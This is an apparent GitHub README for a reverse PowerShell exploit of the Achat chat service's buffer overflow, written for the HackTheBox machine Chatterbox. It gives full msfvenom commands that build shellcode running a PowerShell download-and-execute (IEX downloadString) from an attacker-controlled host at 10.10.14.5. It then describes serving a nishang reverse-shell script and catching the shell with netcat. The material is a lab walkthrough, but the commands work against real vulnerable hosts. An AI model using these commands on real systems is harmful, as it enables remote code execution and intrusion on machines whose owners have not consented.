# achat-Reverse_Powershell
Reverse Powershell Script for the achat service

You can see the full example of how to exploit this based on the htb box [Chatterbox](https://hackmd.io/@codeAssassin/HyQTcxSqC)

## Exploit Logic
- The achat service is vulnerable to a buffer overflow exploit.
- To leverage the exploit, we generate a payload with msfvenom based on powershell and we specify a file to be downloaded on the remote server (in this case we name it Awaken.rocks)
- Start a python web server from which the file (Awaken.rocks) will be downloaded
- We create a listener on the desired ip and port with netcat
- We run the exploit and that should open up a reverse shell on the listening port.

### Achat service vulnerability
Based on [Achat exploit](https://www.exploit-db.com/exploits/36025)

### Generate payload
Use the command to create the desired exploit
```=1
  msfvenom \
  -a x86 \
  --platform Windows \
  -p windows/exec \
  CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Awaken.rocks')\"" \
  -e x86/unicode_mixed \
  -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xe...
  -f python \
  >> pay
  
# or as a one-liner
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Awaken.rocks')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python >> pay
```

Use the output payload to edit the python script and edit the server address details at the bottom
![image](https://hackmd.io/_uploads/ByP317HcC.png)



We can use the nishang powershell script to invoke a reverse shell then set up a listener on the desired port
Remember to change the IP address and port, copy the line to the bottom of the nishang script, then copy the script to the folder where you will run the webserver to have the victim download the script from.

